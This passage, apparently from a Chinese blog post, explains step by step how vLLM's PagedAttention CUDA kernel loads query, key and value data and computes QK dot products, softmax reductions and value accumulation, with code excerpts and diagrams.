class="code"><pre><code class="hljs c++">__shared__ Q_vec q_vecs[THREAD_GROUP_SIZE][NUM_VECS_PER_THREAD];<br><span class="hljs-comment">// 从 global mem load 到 shared mem，一个线程管一行 循环一次 load 一个 vec</span><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> unroll</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = thread_group_idx; i &lt; NUM_VECS_PER_THREAD; i += NUM_THREAD_GROUPS) &#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> vec_idx = thread_group_offset + i * THREAD_GROUP_SIZE;<br>    q_vecs[thread_group_offset][i] = *<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> Q_vec*&gt;(q_ptr + vec_idx * VEC_SIZE);<br>  &#125;<br></code></pre></td></tr></table></figure><p>这些线程组织起来，我们就需要一个 <code>q_vecs</code> 来管理它们。注意，<code>q_ptr</code> 指向的是全局内存 query，cuda 程序会将它们 load 到共享内存，组成 <code>q_vecs</code> 数组。每个线程负责处理 <code>q_vecs</code> 中一行的数据。上图中，如果 <code>THREAD_GROUP_SIZE</code> 是 2, thread 0 则会处理第 0 行的 vecs，而 thread 1 处理第 1 行 vecs。这样读取 query 数据的好处是，相邻的线程能读取到相邻的内存数据，利用了内存合并（memory coalescing）获得性能上的提升。</p><p>这部分内容理解起来不算困难，但请大家记住这一个例子：</p><ul><li><code>VEC_SIZE</code> 是 4</li><li><code>HEAD_SIZE</code> 是 128</li><li><code>V_VEC_SIZE</code> 将为 8</li><li>thread 0 load 了 vec0 vec2 vec4 等偶数项</li></ul><h1>Key</h1><p>与上节相似，这一节我们介绍一下 key 张量的内存排布以及 load 过程。上文提到，每个 thread group 只会处理一个 query token，但要多个 key tokens 参与计算。而每个 warp 会多次循环，以处理每个 KV block 的 key token，从而确保所有 context tokens 被一个 thread group 计算到（即将 query 与所有相关 key 做点乘）。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">scalar_t</span>* k_ptr = k_cache + physical_block_number * kv_block_stride<br>                    + kv_head_idx * kv_head_stride<br>                    + physical_block_offset * x;<br></code></pre></td></tr></table></figure><p>与 <code>q_ptr</code> 不同，在每次循环中，每个线程的 <code>k_ptr</code> 指向的是不同 key token 张量。就如上面的代码所述，<code>physical_block_offset</code> 就是 block 内的偏移量，<code>k_ptr</code> 的值取决于 KV cache 的 block 块，kv head 和现在读到的 kv token 偏移。</p><p><img src="https://docs.vllm.ai/en/stable/_images/key.png" alt="Key data of all context tokens at one head"></p><p>上面这张图解释了 key 张量的内存布局。我们假设 <code>BLOCK_SIZE</code> 为 16，<code>HEAD_SIZE</code> 是 128，<code>x</code>（即一个 thread group 处理的元素个数）是 8，<code>THREAD_GROUP_SIZE</code> 是 2，这里一共有 4 个 warps。可以看出，左半部图中 block0 有 16 个 token 编号 0-15，每个 token 内有 32 个 vec。右半边图展示了 4 个 warps 分别处理不同的 block，四个一循环后 warp0 的下一个外循环会处理 block4。每个大矩形代表一个注意力头计算时需要的 key token 数据，它们由一个 thread group 完成计算。</p><p>还记得之前请大家记住的例子么，这里的数据沿用了之前的例子，所以 thread 0 仍然 load query token 的 vec0 vec2 vec4 等偶数项，相对应地，thread 0 还 load 了 key token 的偶数项。load 完成后，可以直接计算它们的 QK 值了。</p><p><img src="https://docs.vllm.ai/en/stable/_images/k_vecs.png" alt=" for one thread"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">K_vec k_vecs[NUM_VECS_PER_THREAD]<br></code></pre></td></tr></table></figure><p>下面，我们来看一下从 <code>k_ptr</code> 全局内存读入 key token，存储到 <code>k_vecs</code> 的寄存器内存。<code>k_vecs</code> 之所以使用寄存器内存是因为它一次只会被一个线程访问，而上文介绍的 <code>q_vecs</code> 会被多个线程多次访问。每个 <code>k_vecs</code> 会包含多个 vec 用于后续计算。每个 vec 在内循环中使用。同一 warp 内的相邻线程可以一起将相邻的 vecs 的读取进来，这里又利用了内存的 CUDA 内存合并以提升性能。举例说明，thread 0 读取 vec0，thread 1 读取 vec1，在下一个内循环中，thread 0 读取 vec2，thread 1 读取 vec3。</p><p>也许你会对上面的过程感到困惑，不必担心，接下去的 QK 节会更详细、清晰地解释 query 和 key 如何完成计算过程。</p><h1>QK</h1><p>在 query 部分，我们用代码展示了，在程序准备计算之前，会用一个 for 循环 load 一个 query token，并存放在 <code>q_vecs</code> 内。然后，这里有三层循环来描述 QK 的计算过程。在最外面的循环控制着 KV block 的变更，对应了 key 章节图中的右半部分。在第二层循环中，<code>k_vecs</code> 会被循环地指向不同的 tokens，而在最内循环中 <code>k_vecs</code> 会去一个个地 load 对应的 key vec。最后在第二层循环中计算 <code>q_vecs</code> 和 每个 <code>k_vecs</code> 的点乘运算。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++">q_vecs = ...<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> block_idx = start_block_idx + warp_idx; block_idx &lt; end_block_idx; block_idx += NUM_WARPS) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NUM_TOKENS_PER_THREAD_GROUP; i++) &#123;<br>        k_ptr = ...<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; NUM_VECS_PER_THREAD; j++) &#123;<br>            k_vecs[i] = ...<br>        &#125;<br>        ...<br>        <span class="hljs-type">float</span> qk = scale * Qk_dot&lt;<span class="hljs-type">scalar_t</span>, THREAD_GROUP_SIZE&gt;::<span class="hljs-built_in">dot</span>(q_vecs[thread_group_offset], k_vecs);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>之前提到，对于每个 thread，它一次只会读入部分 query 和 key token 张量。然而，在计算 <code>Qk_dot&lt;&gt;::dot</code> 内部，thread group 内所有线程都已经执行了 reduction。 所以 <code>qk</code> 返回的结果不是部分 query 和 key，而是整个 query 和 key token 的点乘相加的结果。</p><p>例如，如果 <code>HEAD_SIZE</code> 是 128，<code>THREAD_GROUP_SIZE</code> 是 2，每个线程的 <code>k_vecs</code> 就会包含总共 64 个元素。然而，计算返回值 <code>qk</code> 实际上是 128 个 query 元素和 128 个 key 元素的点乘值。</p><p>接下来，我们来仔细看看 <code>Qk_dot&lt;&gt;::dot</code> 的实现，看它是否如上面文字描述的那样完成了这些计算和归一。因为 <code>Qk_dot&lt;&gt;::dot</code> 最终调用了函数 <code>qk_dot_</code>，我们直接来看它的实现。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-comment">// Q*K^T operation.</span><br><span class="hljs-function"><span class="hljs-keyword">template</span>&lt;<span class="hljs-type">int</span> THREAD_GROUP_SIZE, <span class="hljs-keyword">typename</span> Vec, <span class="hljs-type">int</span> N&gt;</span><br><span class="hljs-function"><span class="hljs-keyword">inline</span> __device__ <span class="hljs-type">float</span> <span class="hljs-title">qk_dot_</span><span class="hljs-params">(<span class="hljs-type">const</span> Vec (&amp;q)[N], <span class="hljs-type">const</span> Vec (&amp;k)[N])</span> </span>&#123;<br>  <span class="hljs-keyword">using</span> A_vec = <span class="hljs-keyword">typename</span> FloatVec&lt;Vec&gt;::Type;<br>  <span class="hljs-comment">// Compute the parallel products for Q*K^T (treat vector lanes separately).</span><br>  A_vec qk_vec = <span class="hljs-built_in">mul</span>&lt;A_vec, Vec, Vec&gt;(q[<span class="hljs-number">0</span>], k[<span class="hljs-number">0</span>]);<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> unroll</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> ii = <span class="hljs-number">1</span>; ii &lt; N; ++ii) &#123;<br>    qk_vec = <span class="hljs-built_in">fma</span>(q[ii], k[ii], qk_vec);<br>  &#125;<br><br>  <span class="hljs-comment">// Finalize the reduction across lanes.</span><br>  <span class="hljs-type">float</span> qk = <span class="hljs-built_in">sum</span>(qk_vec);<br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> unroll</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> mask = THREAD_GROUP_SIZE / <span class="hljs-number">2</span>; mask &gt;= <span class="hljs-number">1</span>; mask /= <span class="hljs-number">2</span>) &#123;<br>    qk += <span class="hljs-built_in">VLLM_SHFL_XOR_SYNC</span>(qk, mask);<br>  &#125;<br>  <span class="hljs-keyword">return</span> qk;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VLLM_SHFL_XOR_SYNC(var, lane_mask) __shfl_xor_sync(uint32_t(-1), var, lane_mask)</span><br></code></pre></td></tr></table></figure><p>前半部分就是在计算 <code>q</code> 和 <code>k</code> 张量的内积。</p><p>最后的部分归一值得一看，它使用了我之前文章里介绍的<a href="https://dingfen.github.io/2020/12/17/2020-12-17-PP02/">使用蝶式算法并行求和的方法</a>。每个线程同其相邻的线程完成数字交换，并相加，一层层地迭代计算后，最终所有线程都计算得到了总和值。</p><p><code>__shfl_xor_sync(uint32_t(-1), var, lane_mask)</code> 是 CUDA 线程束内的 shuffle 指令，它通过对线程调用者的 ID 进行按位异或来计算目标线程的 ID，并获得目标线程的变量值。</p><h1>Softmax</h1><p>计算完 <code>qk</code> 值后，我们需要计算这些值的 softmax，下面的公式展示了 softmax 计算的具体过程，其中 x 表示 <code>qk</code> 返回的值。为了计算 m(x)，我们必须获得 <code>qk</code> 张量的 reduced 值 <code>qk_max</code> <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>m</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">m(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span>，以及 <code>exp_sum</code>值 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">l(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span>。当然，这些 reduced 值必须横跨整个 thread block 来获得，因为前文我们说过，只有整个 thread block 才有 query token 和整个 context 的 key token。</p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>m</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mrow><mi>max</mi><mo>⁡</mo></mrow><mi>i</mi></munder><msub><mi>x</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">m(x)=\max_i{x_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.1582em;vertical-align:-0.7277em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.4306em;"><span style="top:-2.3723em;margin-left:0em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span><span class="mop">max</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.7277em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">[</mo><msup><mi>e</mi><mrow><msub><mi>x</mi><mn>1</mn></msub><mo>−</mo><mi>m</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mi mathvariant="normal">.</mi><mo separator="true">,</mo><msup><mi>e</mi><mrow><msub><mi>x</mi><mi>B</mi></msub><mo>−</mo><mi>m</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">f(x)=[e^{x_1-m(x)},...,e^{x_B-m(x)}]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.188em;vertical-align:-0.25em;"></span><span class="mopen">[</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3173em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">m</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">x</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">...</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.938em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3567em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight" style="margin-right:0.05017em;">B</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.1433em;"><span></span></span></span></span></span></span><span class="mbin mtight">−</span><span class="mord mathnormal mtight">m</span><span class="mopen mtight">(</span><span class="mord mathnormal mtight">x</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mclose">]</span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mi>i</mi></munder><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><msub><mo stretchy="false">)</mo><mi>i</mi></msub></mrow></mrow><annotation encoding="application/x-tex">l(x)=\sum_i{f(x)_i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.3277em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.05em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></span></span></p><p class="katex-block "><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>s</mi><mi>o</mi><mi>f</mi><mi>t</mi><mi>m</mi><mi>a</mi><mi>x</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mrow><mi>f</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><mrow><mi>l</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">softmax(x)=\frac{f(x)}{l(x)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">so</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal">t</span><span class="mord mathnormal">ma</span><span class="mord mathnormal">x</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.363em;vertical-align:-0.936em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span></p><p>这与理论计算中的 softmax 公式有略微的区别，主要是因为防止 exp 计算出来的值过大导致溢出，因此在计算前需要用一个最大值减去。</p><h2 id="qk-max-and-logits"><code>qk_max</code> and <code>logits</code></h2><p>得到了 <code>qk</code> 值的计算结果后，我们可以将临时地用 <code>logits</code> 数组存放 <code>qk</code> 的结果。当然，最后 <code>logits</code> 变量应当是归一化后的值。随后，我们在 thread group 中先计算出 <code>qk_max</code> 的值：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">if</span> (thread_group_offset == <span class="hljs-number">0</span>) &#123;<br>   <span class="hljs-type">const</span> <span class="hljs-type">bool</span> mask = token_idx &gt;= context_len;<br>   logits[token_idx - start_token_idx] = mask ? <span class="hljs-number">0.f</span> : qk;<br>   qk_max = mask ? qk_max : <span class="hljs-built_in">fmaxf</span>(qk_max, qk);<br>&#125;<br></code></pre></td></tr></table></figure><p>注意，<code>logits</code> 变量位于共享内存上，所以每个 thread group 会在同一 <code>logits</code> 数组的不同 token 位置完成赋值。最终，<code>logits</code> 数组的长度应当就是 context token 的长度。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> mask = WARP_SIZE / <span class="hljs-number">2</span>; mask &gt;= THREAD_GROUP_SIZE; mask /= <span class="hljs-number">2</span>) &#123;<br>    qk_max = <span class="hljs-built_in">fmaxf</span>(qk_max, <span class="hljs-built_in">VLLM_SHFL_XOR_SYNC</span>(qk_max, mask));<br>&#125;<br><br><span class="hljs-keyword">if</span> (lane == <span class="hljs-number">0</span>) &#123;<br>   red_smem[warp_idx] = qk_max;<br>&#125;<br></code></pre></td></tr></table></figure><p>紧接着，VLLM 仍使用之前的蝶式求和法，将每个 warp 中的最大 <code>qk_max</code> 值找到。即让每个相邻的线程进行通信，比较出最大的 <code>qk_max</code> 值，最终获胜的一定是最大值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> mask = NUM_WARPS / <span class="hljs-number">2</span>; mask &gt;= <span class="hljs-number">1</span>; mask /= <span class="hljs-number">2</span>) &#123;<br>    qk_max = <span class="hljs-built_in">fmaxf</span>(qk_max, <span class="hljs-built_in">VLLM_SHFL_XOR_SYNC</span>(qk_max, mask));<br>&#125;<br>qk_max = <span class="hljs-built_in">VLLM_SHFL_SYNC</span>(qk_max, <span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>同样的方法，我们在 thread block 中比较每个 warp 的 <code>qk_max</code> 值，这样我们就能获得整个 thread block 的 <code>qk_max</code>，然后，我们需要将它广播给所有线程。</p><h2 id="exp-sum"><code>exp_sum</code></h2><p>与 <code>qk_max</code> 的计算方法类似，我们也需要获得整个 thread block 的 reduced 求和值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = thread_idx; i &lt; num_tokens; i += NUM_THREADS) &#123;<br>    <span class="hljs-type">float</span> val = __expf(logits[i] - qk_max);<br>    logits[i] = val;<br>    exp_sum += val;<br>&#125;<br><span class="hljs-comment">//...</span><br>exp_sum = <span class="hljs-built_in">block_sum</span>&lt;NUM_WARPS&gt;(&amp;red_smem[NUM_WARPS], exp_sum);<br></code></pre></td></tr></table></figure><p>首先，我们在一个 thread group 内求和得到所有 exp 值的总和。但首先，需要将 <code>logits</code> 数组内的 <code>qk</code> 值（上一步我们存放的）转变为 <code>exp(qk-qk_max)</code>值。请注意，上一步的 <code>qk_max</code> 已经被广播给了所有 thread，因此这一步是可以完成的。</p><p>然后，我们可以对 <code>exp_sum</code> 做归一求和，使用之前一样的蝶式求和法。两个线程做通信，求得各自的 <code>exp_sum</code> 和即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> <span class="hljs-type">float</span> inv_sum = __fdividef(<span class="hljs-number">1.f</span>, exp_sum + <span class="hljs-number">1e-6</span>f);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = thread_idx; i &lt; num_tokens; i += NUM_THREADS) &#123;<br>   logits[i] *= inv_sum;<br>&#125;<br></code></pre></td></tr></table></figure><p>最后，当我们求得了 <code>exp_sum</code> 后，就可以计算出最终的归一 softmax 值，并存放到 <code>results</code>。该变量会在后续的步骤中被用于与 value 张量做点乘运算。</p><h1>Value</h1><p>在执行完前文描述的步骤后，现在它们已经获得了 <code>logits</code> 数组了，又因为 QK 的计算会被 reduce 到 warp 上所有的线程，以及 4 个 warp 对所有 context 的 block 的遍历，所以每个线程现在都有 <code>HEAD_SIZE</code> * <code>BLOCK_SIZE</code> 个 <code>logits</code> 值。</p><p>搞明白了这个前提后，再来看看 value 张量的内存布局和 load 情况吧。</p><p><img src="https://docs.vllm.ai/en/stable/_images/value.png" alt="Value data of all context tokens at one head"></p><p><img src="https://docs.vllm.ai/en/stable/_images/logits_vec.png" alt=" for one thread"></p><p><img src="https://docs.vllm.ai/en/stable/_images/v_vec.png" alt="List of  for one thread"></p><p>先来看第一张图，虽然 value 部分不涉及到 thread group 的东西，但为了理解方便图中仍然画出了两个 thread，这是之前计算 QK 时留下的一组 thread group。</p><p>我们需要检索 value 张量，然后计算与 <code>logits</code> 的点乘了。不像 query 和 key，value 处理数据是跨 token 的，它会同时计算不同 token 的数据，且没有涉及到 thread group。第一张图中展示了 value 的内存排布，同一列的元素对应着同一个 value token，不同列就是不同的 token 了。</p><p>对于一个 block 的 value 数据，它有 <code>HEAD_SIZE</code> 行和 <code>BLOCK_SIZE</code> 列，每个部分都被分成 <code>v_vecs</code>。其中 thread 0 则 load 了 32 的倍数的 v_vec，thread 1 则 load 了 32 的倍数余 1 的 v_vec。在之前举出的例子中，v_vec 的大小为 8，因此图二画了 8 个 vec，每个 vec 分别对应了不同的 token。</p><p>再来重点关注最后一张图，每个线程一次从 <code>V_VEC_SIZE</code> 个 token 中 load <code>V_VEC_SIZE</code> 个元素。以 thread 0 为例，在内循环中，它会检索多个不同行但同一列的 <code>v_vecs</code> 。对于每个 <code>v_vec</code>，他需要与相应的 <code>logits_vec</code> 做点乘，这里 <code>logits_vec</code> 变量就是上节计算得到的 <code>V_VEC_SIZE</code> 个 <code>logits</code> 的数组元素。总的来看，多个内循环中，每个 warp 会处理一个 block 的 value tokens，经过多个外循环后，整个 context value token 都会被计算到。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">float</span> accs[NUM_ROWS_PER_THREAD];<br><span class="hljs-comment">// Iteration over different blocks.</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> block_idx = start_block_idx + warp_idx; block_idx &lt; end_block_idx; block_idx += NUM_WARPS) &#123;<br>    logits_vec = *<span class="hljs-built_in">reinterpret_cast</span>&lt;Float_L_vec*&gt;(logits + token_idx - start_token_idx)<br>    <span class="hljs-comment">// Iteration over different rows.</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; NUM_ROWS_PER_THREAD; i++) &#123;<br>        <span class="hljs-type">const</span> <span class="hljs-type">cache_t</span>* v_ptr = v_cache + physical_block_number * kv_block_stride<br>                                + kv_head_idx * kv_head_stride;<br>        v_vec = *<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">const</span> V_vec*&gt;(v_ptr + offset);<br>        